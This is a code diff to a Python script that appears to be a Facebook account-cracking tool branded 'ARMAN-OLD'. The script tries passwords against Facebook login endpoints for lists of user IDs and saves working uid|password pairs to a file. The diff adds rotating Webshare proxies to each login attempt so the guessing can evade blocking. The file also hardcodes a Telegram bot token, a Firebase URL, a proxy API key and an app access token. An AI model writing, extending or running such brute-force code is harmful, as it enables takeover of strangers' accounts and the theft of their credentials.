@@ -36,6 +36,24 @@ FIREBASE_URL = "https://noorsalan-dab42-default-rtdb.firebaseio.com/Noor/"
 BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
 TELEGRAM_USER = "8568795915"
 
+# --- WEBSHARE PROXY SETUP ---
+PROXY_API_URL = "https://proxy.webshare.io/api/v2/proxy/list/download/pbkklilmdcfijgtsxqtmfadbewtkpjbbzugqjoet/-/any/username/direct/-/?plan_id=14073595"
+
+def get_live_proxy():
+    try:
+        res = requests.get(PROXY_API_URL, timeout=5)
+        if res.status_code == 200:
+            proxies_list = res.text.strip().splitlines()
+            if proxies_list:
+                p = random.choice(proxies_list)
+                return {
+                    'http': f'http://{p}',
+                    'https': f'http://{p}'
+                }
+    except Exception:
+        pass
+    return None
+
 def get_server_version():
     try:
         url = "https://noorsalan-dab42-default-rtdb.firebaseio.com/Noor/Version.json"
@@ -580,7 +598,8 @@ def login_1(uid):
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "en-US,en;q=0.9"
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            proxy = get_live_proxy()
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, proxies=proxy, allow_redirects=False).json()
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
@@ -608,7 +627,8 @@ def login_2(uid):
                     "Accept-Language": "en-US,en;q=0.9"
                 }
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-                po = session.get(url, headers=headers).json()
+                proxy = get_live_proxy()
+                po = session.get(url, headers=headers, proxies=proxy).json()
                 if 'session_key' in str(po):
                     print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                     open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
